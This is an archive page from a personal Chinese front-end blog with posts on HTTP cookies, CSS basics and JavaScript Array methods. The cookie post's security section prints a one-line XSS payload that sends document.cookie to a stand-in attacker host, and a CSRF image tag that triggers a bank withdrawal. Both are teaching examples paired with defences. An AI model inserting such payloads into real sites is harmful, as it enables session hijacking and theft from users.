<h5 id="持久性-Cookie"><a href="#持久性-Cookie" class="headerlink" title="持久性 Cookie"></a>持久性 Cookie</h5><p>持久性 Cookie 可以指定一个特定的过期时间（Expirse）或有效期（Max-Age）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = xxx; Expirse = 时间点（Max-Age = 时长）&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="secure-标记"><a href="#secure-标记" class="headerlink" title="secure 标记"></a>secure 标记</h5><p>安全的 Cookie 只应通过 HTTPS 协议加密过的请求发送给服务端，设置 secure 标记的 Cookie 只在 HTTPS 中生效</p>
<h5 id="HttpOnly-标记"><a href="#HttpOnly-标记" class="headerlink" title="HttpOnly 标记"></a>HttpOnly 标记</h5><p>由于 Cookie 可以通过 JS 的 <code>document.cookie</code> 进行修改，但是通过 JS 的 <code>document.cookie</code> 无法访问带有 HttpOnly 标记的 Cookie，所以包含服务端 Session 信息的 Cookie 不想被浏览器的 JS 脚本调用，设置 HttpOnly 标记即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = a3fWa; Expires = GMT时间格式; Secure; HttpOnly&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="Cookie-作用域"><a href="#Cookie-作用域" class="headerlink" title="Cookie 作用域"></a>Cookie 作用域</h5><p><code>Domain</code> + <code>Path</code> 标识定义了 Cookie 的作用域，即 Cookie 应该发送给那些 URL</p>
<ul>
<li><p><code>Domain</code> ==&gt; 制定哪些主机可以接收 Cookie，如果不指定，不包含子域名，如果指定了 <code>Domain</code> 则一般包含子域名。例如，如果设置 <code>Domain = mozilla.org</code>，则 Cookie 也包含在子域名中（如 <code>developer.mozilla.org</code>）</p>
</li>
<li><p><code>Path</code> ==&gt; 制定了主机下哪些路径可以接收 Cookie（该 URL 路径必须存在于请求 URL 中）。例如，设置 <code>Path = /docs</code>，那么以下路径都会匹配 <code>/docs</code> | <code>/docs/web</code> | <code>/docs/web/http</code></p>
</li>
</ul>
<h5 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h5><p>SameSite Cookie 允许服务器指定在跨站请求时该 Cookie 是否会被发送，从而可以阻止跨站请求伪造攻击（CSRF）</p>
<h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><h5 id="会话挟持和-XSS"><a href="#会话挟持和-XSS" class="headerlink" title="会话挟持和 XSS"></a>会话挟持和 XSS</h5><p>在 web 应用中，Cookie 常用来标记用户或授权会话，因此如果 web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure></p>
<p><code>HttpOnly</code> 类型的 Cookie 由于阻止了 JS 对 Cookie 的操作而能在一定程度上缓解此类攻击</p>
<h5 id="CSRF（跨域请求伪造）"><a href="#CSRF（跨域请求伪造）" class="headerlink" title="CSRF（跨域请求伪造）"></a>CSRF（跨域请求伪造）</h5><p>如果在不安全的聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>当打开含有这张图片的 HTML 页面时，如果之前登录了银行账号并且 Cookie 仍然有效（还没有其他验证步骤），银行中的钱会被自动转走。</p>
<h6 id="阻止-CSRF"><a href="#阻止-CSRF" class="headerlink" title="阻止 CSRF"></a>阻止 CSRF</h6><ol>
<li>对用户输入进行过滤来阻止 XSS</li>
<li>任何敏感操作都需要确认</li>
<li>用于敏感信息的 Cookie 只能拥有较短的生命周期</li>
</ol>
<h3 id="Cookie-特点"><a href="#Cookie-特点" class="headerlink" title="Cookie 特点"></a>Cookie 特点</h3><ol>
<li>Cookie 储存用户信息</li>
<li>服务器通过 <code>Set-Cookie</code> 响应头设置 Cookie </li>
<li>浏览器得到 Cookie 后，每次请求相同域名都要带上 Cookie </li>
<li>服务器通过 Cookie 得知是哪个用户（<code>request.headers.cookie</code> // 读取 Cookie ）</li>
<li>Cookie 存储在本地的一个文件中</li>
<li>Cookie 不安全，用户可以通过开发者工具 Application/Cookie 可以进行修改，或者 JS 的 <code>document.cookie</code> 进行修改</li>
<li>每个浏览器的 Cookie 不同</li>
<li>Cookie 有时效性</li>
<li>后端可以强制设置 Cookie 有效期</li>
<li>Cookie 按域名划分。一个网站只会带着自己域名的 Cookie ，不会带着其他域的 Cookie </li>
</ol>
<h5 id="Cookie-说明"><a href="#Cookie-说明" class="headerlink" title="Cookie 说明"></a>Cookie 说明</h5><p>Cookie 大小受限，每次请求新的页面 Cookie 都会被发送过去。Cookie 不能跨域调用。Cookie 的作用是与服务器进行交互，Cookie 作为 HTTP 规范的一部分存在 </p>
<h5 id="删除-Cookie"><a href="#删除-Cookie" class="headerlink" title="删除 Cookie"></a>删除 Cookie</h5><ul>
<li>服务器端可以通过设置 Expires、max-age 两个标签将 Cookie 设置为过期状态</li>
<li>JavaScript 可以通过document.cookie API 删除 Cookie</li>
</ul>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><ol>
<li><p><code>formdata</code> 是一段一段上传的，上传时会触发 <code>data</code> 事件（node http get post data）</p>
</li>
<li><p>前端是不安全的，所以前端可以不进行验证，但是后端必须进行验证。用户可以通过 <code>curl</code> 发送请求，这样就越过了前端 JS</p>
</li>
<li><p><code>decodeURIComponent()</code><br>用于解码由 <code>encodeURIComponent()</code> 方法或其他类似方法编码的部分 URI（统一资源标识符）</p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener"><code>Set-Cookie</code></a></p>
</li>
<li><p>CSRF（跨域请求伪造） 是指一种挟持受信任用户向服务器发送非预期请求的攻击方式。例如，这些非预期请求可能在 URL 后加入一些恶意的参数，从而达到攻击者的目的</p>
</li>
<li><p>XSS（Cross-site scripting）是一种安全漏洞，攻击者利用这种漏洞在网上注入恶意的客户端代码。当被攻击者登录网站时就会自动运行这些恶意代码，从而攻击者可以突破网站的访问权限，冒充受害者。</p>
<ul>
<li>如果 Web 应用程序没有部署足够的安全验证，那么这些脚本可以任意读取 Cookie或者其他敏感的网站信息，或者让恶意脚本重写 HTML 内容</li>
<li>以下两种情况最容易发生 XSS 攻击<ol>
<li>数据从一个不可靠的链接进入一个 Web 应用程序</li>
<li>没有过滤掉恶意代码的动态内容被发送给 Web 用户</li>
</ol>
</li>
<li>XSS 攻击类型<ol>
<li><strong>存储型（持久型）</strong>：注入型脚本永久存储在目标服务器上，当浏览器请求数据时，脚本从服务器上传回并执行</li>
<li><strong>反射型（非持久型）</strong>：当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站，Web 服务器将注入脚本，比如一个错误信息、搜索结果等返回到用户浏览器上，浏览器会执行这个脚本，因为，浏览器认为这个响应来自可信任的服务器</li>
<li>基于 DOM 的 XSS：被执行的恶意脚本会修改页面脚本结构</li>
</ol>
</li>
</ul>
</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/HTTP/">HTTP</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-05T14:54:05.000Z"><a href="/2018/02/05/总结篇（二）-- 基础知识之 CSS/">2018-02-05</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/05/总结篇（二）-- 基础知识之 CSS/">总结篇（二） -- 基础知识之 CSS</a></h1>
  

    </header>
    <div class="entry">
      
        <ol>
<li><p>选择器</p>
<ul>
<li>标签选择器</li>
<li>类选择器</li>
<li>ID 选择器</li>
<li>后代选择器</li>
<li>子选择器</li>
<li>通用选择器</li>
<li>伪类选择符</li>
<li>分组选择符</li>
</ul>
</li>
<li><p>文档流<br> 内联元素 ==&gt; 从左向右依次流动<br> 块级元素 ==&gt; 从上到下依次流动，每个块级元素独占一行</p>
</li>
<li>盒模型<br> box-sizing: content-box; ==&gt; 标准盒模型，width = contentWidth<br> box-sizing: border-box; ==&gt; width = contentWidth + padding + border</li>
<li>伪类<br> 伪类有动态伪类、结构伪类、否定伪类等等<ul>
<li>动态伪类：<br><code>:link</code> ==&gt; 未访问前的样式效果<br><code>:hover</code> ==&gt; 鼠标悬停时的样式效果<br><code>:active</code> ==&gt; 鼠标点击时的样式效果<br><code>:visited</code> ==&gt; 访问后的样式效果<br><code>:focus</code> ==&gt; 元素成为焦点时的样式效果</li>
<li>结构伪类<br><code>:first-child</code> ==&gt; 第一个子元素<br><code>:last-child</code> ==&gt; 最后一个子元素<br><code>:nth-child(n)</code> ==&gt; 第 n 个子元素</li>
<li>否定伪类<br><code>:not</code> ==&gt; 不符合参数选择器 X 描述的元素</li>
</ul>
</li>
<li>伪元素<ul>
<li><code>::before</code> ==&gt; 创建伪元素，此伪元素是元素的第一个子元素</li>
<li><code>::after</code> ==&gt; 创建伪元素，此伪元素是元素的最后一个子元素</li>
</ul>
</li>
<li><p>堆叠上下文（BFC）<br> BFC 就是块级格式化上下文。形成 BFC 条件：</p>
<ul>
<li>浮动</li>
<li>绝对定位元素（<code>position: absolute;</code>）</li>
<li>非块盒的块容器（<code>display: inline-block; | display: table-cells</code>）</li>
<li>overflow 不为 visible 的块盒</li>
<li><p><code>display: flow-root</code></p>
<p>功能：</p>
</li>
</ul>
<ol>
<li>将内部浮动元素包裹起来</li>
<li>两个相邻的 BFC 之间划清界限</li>
</ol>
</li>
<li><p>媒体查询<br> <code>&lt;link&gt;</code> 标签中的媒体查询</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; metia=&quot;(max-width: 800px)&quot; href=&quot;xxx.css&quot;&gt;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">样式表中的 CSS 媒体查询</span><br></pre></td></tr></table></figure>
<p> <style></p>
<pre><code>@media (max-width: 800px) and (min-width: 600px) {
    // 选择器 + 样式
}
</code></pre><p> </style></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8. 动态 REM</span><br><span class="line">    rem 是相对单位长度，它是根元素 ` &lt;html&gt; ` 的 ` font-size ` 的大小，网页默认的 ` font-size: 16px `，运用 JS 探取屏幕宽度，之后定义根元素的 ` </span><br><span class="line">font-size ` 与屏幕宽度相关，之后一切单位都以屏幕宽度为基准</span><br></pre></td></tr></table></figure>
<p> <script></p>
<pre><code>let pageWidth = window.innerWidth
document.write( &apos;&lt;style&gt;html{ font-size:&apos; + pageWidth/10 + &apos;px;}&lt;/style&gt;&apos; )
</code></pre><p> </script><br> ```</p>
</li>
<li>box-shadow<ul>
<li>垂直偏移</li>
<li>水平偏移</li>
<li>模糊半径</li>
<li>模糊尺寸</li>
<li>颜色</li>
</ul>
</li>
<li>transform<ul>
<li><code>translate</code> ==&gt; 移动</li>
<li><code>rotate</code> ==&gt; 旋转</li>
<li><code>skew</code> ==&gt; 倾斜</li>
<li><code>scale</code> ==&gt; 缩放</li>
</ul>
</li>
<li>帧动画<ul>
<li><code>animation-name</code> ==&gt; 动画名称</li>
<li><code>animation-duration</code> ==&gt; 持续时间</li>
<li><code>animation-delay</code> ==&gt; 延迟</li>
<li><code>animation-timing-function</code> ==&gt; 动画类型</li>
<li><code>@keyframe</code> ==&gt; 关键帧</li>
</ul>
</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/总结/">总结</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-05T14:34:07.000Z"><a href="/2018/02/05/JS系列 -- Array 浅析/">2018-02-05</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/05/JS系列 -- Array 浅析/">JS系列 -- Array 浅析</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数组是按次序排列的一组值的集合，它是一个<strong>对象</strong>。<br>数组可以存储任何类型的数据（数字，字符串，布尔值或者对象）</p>
<h3 id="创建方法"><a href="#创建方法" class="headerlink" title="创建方法"></a>创建方法</h3><h5 id="使用-Array-构造函数"><a href="#使用-Array-构造函数" class="headerlink" title="使用 Array 构造函数"></a>使用 Array 构造函数</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-6ea1c407cf635857.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 构造函数"></p>
<h5 id="使用数组字面量表示法"><a href="#使用数组字面量表示法" class="headerlink" title="使用数组字面量表示法"></a>使用数组字面量表示法</h5><p>数组字面量由一对包含数组项的方括号表示，多个数组之间以逗号隔开。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-335e259acf5fba52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 字面量"></p>
<h1 id="属性-length"><a href="#属性-length" class="headerlink" title="属性 length"></a>属性 length</h1><p>表示数组的长度，即数组中元素的个数。<br>数组索引从 0 开始，索引上下限为 0 到 length-1 。<br>数组的 length 属性<strong>不是只读</strong>的，可以进行设置<br><img src="http://upload-images.jianshu.io/upload_images/9617841-def1e376a8012efe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array length 修改"></p>
<p><strong>注意：</strong><br><img src="http://upload-images.jianshu.io/upload_images/9617841-7e72fd6106cc9701.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array length"><br><code>arr02</code> 中 <code>arr02[ 1 ] === undefined</code>，这个元素是存在的，只不过值为 undefined。</p>
<h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>Array 是对象，所以 Array 有对象的一些方法<br><img src="http://upload-images.jianshu.io/upload_images/9617841-b4189f737381258e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 原型"><br>可以为数组添加属性，因为数组是对象。</p>
<h1 id="检测数组"><a href="#检测数组" class="headerlink" title="检测数组"></a>检测数组</h1><ul>
<li><code>Array.isArray()</code> ==&gt; 用于确定传递的值是否是一个 Array</li>
<li><code>value instanceof Array</code> ==&gt; 使用 instanceof 操作符检测数组</li>
<li><code>value.push()</code> ==&gt; 使用数组的特有方法，从而检测数组</li>
</ul>
<h1 id="方法-API"><a href="#方法-API" class="headerlink" title="方法 API"></a>方法 API</h1><h3 id="Object-原型上的-API"><a href="#Object-原型上的-API" class="headerlink" title="Object 原型上的 API"></a>Object 原型上的 API</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-94e2302778e6f341.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Object 原型上的 API"></p>
<h3 id="Array-prototype-API"><a href="#Array-prototype-API" class="headerlink" title="Array.prototype API"></a>Array.prototype API</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-ebda095a9826c3f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 原型上的 API"></p>
<h4 id="栈方法"><a href="#栈方法" class="headerlink" title="栈方法"></a>栈方法</h4><p>栈是一种可以限制插入和删除项的数据结构。它是一种 LIFO（Last-In-First -Out，后进先出）的数据结构，栈中项的插入（推入）和移除（弹出）只发生在一个位置 —- 栈的顶部。</p>
<ul>
<li><code>push()</code> ==&gt; 将一个或多个元素添加到数组的末尾，并<strong>返回新数组的长度</strong>。</li>
<li><code>pop()</code> ==&gt; 从数组中删除最后一个元素，并<strong>返回该元素的值</strong>。此方法更改数组的长度。</li>
</ul>
<h4 id="队列方法"><a href="#队列方法" class="headerlink" title="队列方法"></a>队列方法</h4><p>队列数据结构的访问规则是 FIFO（Fitst-In-Fitst-Out，先进先出），队列在列表的末端添加项，在列表前端移除项。</p>
<ul>
<li><code>shift()</code> ==&gt; 从数组中删除第一个元素，并<strong>返回该元素的值</strong>。此方法更改数组的长度。</li>
<li><code>unshift()</code> ==&gt; 将一个或多个元素添加到数组的开头，并<strong>返回新数组的长度</strong>。</li>
</ul>
<h4 id="重排序方法"><a href="#重排序方法" class="headerlink" title="重排序方法"></a>重排序方法</h4><p>重排序方法 <code>sort()</code> 和<code>reverse()</code> 的<strong>返回值是经过排序之后的数组</strong>，这两种方法都会<strong>改变原数组</strong>。</p>
<ul>
<li><p><code>sort()</code> ==&gt; 在适当的位置对数组的元素进行排序，并<strong>返回数组</strong>。默认排序顺序是根据<strong>字符串Unicode码点</strong>。<br> <img src="http://upload-images.jianshu.io/upload_images/9617841-4bd79d3863269eaf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array sort 排序"><br> <img src="http://upload-images.jianshu.io/upload_images/9617841-b07b786adcc4b08e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array sort 排序"></p>
</li>
<li><p><code>reverse()</code> ==&gt; 将数组中元素的位置颠倒，并<strong>返回该数组的引用</strong>。第一个数组元素成为最后一个数组元素，最后一个数组元素成为第一个。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-03c659fb37fe7170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array reverse"></p>
</li>
</ul>
<h4 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h4><ul>
<li><p><code>concat()</code> ==&gt; 用于合并两个或多个数组。此方法不会更改现有数组，而是<strong>返回一个新数组</strong>。</p>
</li>
<li><p><code>slice()</code> ==&gt; <strong>返回一个从开始到结束（不包括结束）选择的数组的一部分浅拷贝到一个新数组对象</strong>，原数组不会被修改。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-f46d0e64ba879c47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array slice()"></p>
</li>
<li><p><code>splice()</code> ==&gt; 通过删除现有元素和/或添加新元素来更改一个数组的内容。<br><strong>返回由被删除的元素组成的一个数组</strong>。<br><strong>删除了一个元素</strong> ==&gt; <strong>返回只包含一个元素的数组</strong>。<br><strong>没有删除元素</strong> ==&gt; <strong>返回空数组</strong>。<br><strong>参数：</strong> <code>array.splice(start [ , deleteCount [, item1 [, item2, ... ] ] ])</code><br><img src="http://upload-images.jianshu.io/upload_images/9617841-5d25a212665cf00a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array splice API"></p>
</li>
</ul>
<h4 id="位置方法"><a href="#位置方法" class="headerlink" title="位置方法"></a>位置方法</h4><ul>
<li><code>indexOf()</code> ==&gt; <strong>返回在数组中可以找到一个给定元素的第一个索引</strong>，如果不存在，则<strong>返回-1</strong></li>
<li><code>LastIndexOf()</code> ==&gt; <strong>返回指定元素在数组中的最后一个的索引</strong>，如果不存在则<strong>返回 -1</strong>。从数组的后面向前查找</li>
</ul>
<h4 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h4><ul>
<li><p><code>forEach()</code> ==&gt; 对数组的每个元素执行一次提供的函数。<strong>返回 undefined</strong><br>参数：<strong>回调函数</strong>和可选的执行回调函数时用作this的值，<strong>回调函数</strong>接受三个值：</p>
<ol>
<li>数组中正在处理的当前元素</li>
<li>数组中正在处理的当前元素的索引</li>
<li>forEach()方法正在操作的数组<br><img src="http://upload-images.jianshu.io/upload_images/9617841-2ecfa4be91a212d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array forEach"></li>
</ol>
</li>
<li><p><code>map()</code> ==&gt; 创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。<strong>返回一个新数组，每个元素都是回调函数的结果</strong><br><strong>和 <code>forEach</code> 作用一样，只是返回一个新数组</strong><br><img src="http://upload-images.jianshu.io/upload_images/9617841-596d0557d2e52a1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array map"></p>
</li>
<li><p><code>every()</code> ==&gt; 测试数组的所有元素是否都通过了指定函数的测试。<strong>返回布尔值</strong></p>
</li>
<li><p><code>some()</code> ==&gt; 测试数组中的某些元素是否通过由提供的函数实现的测试。<strong>返回布尔值</strong></p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-f3f669c4e73662af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array every + some"></p>
<ul>
<li><code>filter()</code> ==&gt; 创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。 <strong>返回一个新的通过测试的元素的集合的数组</strong></li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-36de13831ddd2bf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array filter"></p>
<h4 id="归并方法"><a href="#归并方法" class="headerlink" title="归并方法"></a>归并方法</h4><ul>
<li><code>reduce()</code> ==&gt; 对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。<strong>返回函数累计处理的结果</strong></li>
<li><code>reduceRight()</code> ==&gt; 接受一个函数作为累加器（accumulator）和数组的每个值（从右到左）将其减少为单个值。<strong>返回函数累计处理的结果</strong></li>
</ul>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  

  <nav id="pagination">
  
    <a href="/archives/2018/02/" class="alignleft prev">Prev</a>
  
  
  <div class="clearfix"></div>
</nav>


</div></div>
      <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:yoursite.com">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">Tags</h3>
  <ul class="entry">
  
    <li><a href="/tags/CSS/">CSS</a><small>10</small></li>
  
    <li><a href="/tags/HTML/">HTML</a><small>1</small></li>
  
    <li><a href="/tags/HTTP/">HTTP</a><small>9</small></li>
  
    <li><a href="/tags/JavaScript/">JavaScript</a><small>11</small></li>
  
    <li><a href="/tags/JavaScript-进阶/">JavaScript 进阶</a><small>4</small></li>
  
    <li><a href="/tags/Plugin/">Plugin</a><small>1</small></li>
  
    <li><a href="/tags/jQuery/">jQuery</a><small>4</small></li>
  
    <li><a href="/tags/前端基础/">前端基础</a><small>4</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>1</small></li>
  
    <li><a href="/tags/总结/">总结</a><small>4</small></li>
  
  </ul>
</div>


</aside>
    
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="aligncenter">
  
  &copy; 2018 吴博文
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://cdn.staticfile.org/jquery/2.1.1-rc2/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>



<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>
<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script src="https://www.zybuluo.com/static/MathJax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</script>


  
    <!-- Go to www.addthis.com/dashboard to customize your tools -->
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-59a3e3079f1b7ad5"></script> 
  

</body>
</html>
